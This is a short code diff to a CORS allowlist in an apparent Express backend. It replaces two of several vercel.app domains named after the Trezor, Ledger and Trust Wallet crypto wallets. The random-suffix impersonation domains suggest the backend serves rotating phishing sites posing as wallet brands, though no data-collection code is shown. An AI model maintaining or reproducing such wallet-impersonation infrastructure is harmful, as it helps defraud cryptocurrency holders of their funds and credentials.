@@ -15,8 +15,8 @@ app.use(cors({
         "https://trezor-aws-rame-pod-paint-sigma-rolee-324324-psi.vercel.app", //website
         "https://trezor-aws-o2o4-rame-pod-paint-sigma-rolee-324324-psi.vercel.app",
         "https://trezor-2wxu-sepia-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
-        "https://ledger-aws-e6p2-sepia-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
-        "https://ledger-two-phi-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
+        "https://ledger-two-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
+        "https://ledger-aws-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://ledger-orpin-tan-omega-firgme-rule-324324-psi.vercel.app",
         "https://ledger-aws-tan-omega-firgme-rule-324324-psi.vercel.app",//aws
         "https://trust-wallet-blond-eight-sigma-dfasf.vercel.app",
